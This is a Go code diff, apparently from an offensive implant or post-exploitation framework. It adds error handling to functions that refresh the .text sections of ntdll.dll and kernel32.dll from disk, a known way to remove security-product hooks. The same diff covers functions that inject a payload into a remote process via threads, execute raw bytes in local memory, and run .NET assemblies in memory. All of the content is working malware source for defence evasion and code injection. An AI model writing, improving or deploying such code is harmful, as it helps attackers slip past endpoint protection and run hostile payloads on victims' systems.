@@ -102,21 +102,26 @@ func ptr(val interface{}) uintptr {
 	}
 }
 
-func RefreshPE(name string) {
+func RefreshPE(name string) error {
 	df, e := ioutil.ReadFile(name)
-
+	if e != nil {
+		return e
+	}
 	f, e := pe.Open(name)
 	if e != nil {
-		panic(e)
+		return e
 	}
 
 	x := f.Section(".text")
 	ddf := df[x.Offset:x.Size]
-	writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
+	return writeGoodBytes(ddf, name, x.VirtualAddress, x.Name, x.VirtualSize)
 }
 
-func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) {
-	t, _ := syscall.LoadDLL(pn)
+func writeGoodBytes(b []byte, pn string, virtualoffset uint32, secname string, vsize uint32) error {
+	t, e := syscall.LoadDLL(pn)
+	if e != nil {
+		return e
+	}
 	h := t.Handle
 	dllBase := uintptr(h)
 
@@ -198,8 +203,14 @@ func injectTask(processHandle syscall.Handle, data []byte) error {
 
 // RermoteTask - Injects Task into a processID using remote threads
 func RemoteTask(processID int, data []byte) error {
-	RefreshPE(`c:\windows\system32\ntdll.dll`)
-	RefreshPE(`c:\windows\system32\kernel32.dll`)
+	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	if err != nil {
+		return err
+	}
+	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	if err != nil {
+		return err
+	}
 	processHandle, err := syscall.OpenProcess(PROCESS_ALL_ACCESS, false, uint32(processID))
 	if processHandle == 0 {
 		return err
@@ -212,8 +223,14 @@ func RemoteTask(processID int, data []byte) error {
 }
 
 func LocalTask(data []byte) error {
-	RefreshPE(`c:\windows\system32\ntdll.dll`)
-	RefreshPE(`c:\windows\system32\kernel32.dll`)
+	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	if err != nil {
+		return err
+	}
+	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	if err != nil {
+		return err
+	}
 	size := len(data)
 	addr, _ := sysAlloc(size)
 	buf := (*[9999999]byte)(unsafe.Pointer(addr))
@@ -228,8 +245,14 @@ func LocalTask(data []byte) error {
 }
 
 func ExecuteAssembly(hostingDll, assembly []byte, params string, timeout int32) (string, error) {
-	RefreshPE(`c:\windows\system32\ntdll.dll`)
-	RefreshPE(`c:\windows\system32\kernel32.dll`)
+	err := RefreshPE(`c:\windows\system32\ntdll.dll`)
+	if err != nil {
+		return "", err
+	}
+	err = RefreshPE(`c:\windows\system32\kernel32.dll`)
+	if err != nil {
+		return "", err
+	}
 	// {{if .Debug}}
 	log.Println("[*] Assembly size:", len(assembly))
 	log.Println("[*] Hosting dll size:", len(hostingDll))
